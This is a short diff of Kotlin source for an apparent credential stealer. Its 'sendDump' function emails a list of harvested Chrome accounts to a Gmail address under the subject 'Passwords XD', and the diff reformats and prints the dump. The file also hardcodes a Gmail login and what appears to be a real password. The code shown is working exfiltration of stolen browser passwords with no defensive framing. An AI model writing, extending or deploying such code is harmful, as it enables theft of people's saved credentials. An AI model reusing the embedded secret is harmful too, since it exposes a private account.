@@ -4,7 +4,7 @@ import javax.mail.internet.InternetAddress
 import javax.mail.internet.MimeMessage
 
 object MailerTLS {
-    private const val emailToUse = "yourGmail@gmail.com" /* Your gmail */
+    private const val emailToUse = "yourgmailaccount@gmail.com" /* Your gmail */
     private const val password = "A51e93A9EkZTAY" /* Your gmail password*/
 
     private val properties: Properties = Properties().apply {
@@ -29,7 +29,8 @@ object MailerTLS {
             }
 
     fun sendDump(email: String, listOfAccounts: List<ChromeAccount>): Boolean = try {
-        val body = listOfAccounts.toString()
+        val body = listOfAccounts.joinToString("\n")
+        println(body)
         generatePlainTextEmail(email, "Passwords XD", body).run { Transport.send(this) }
 
         true
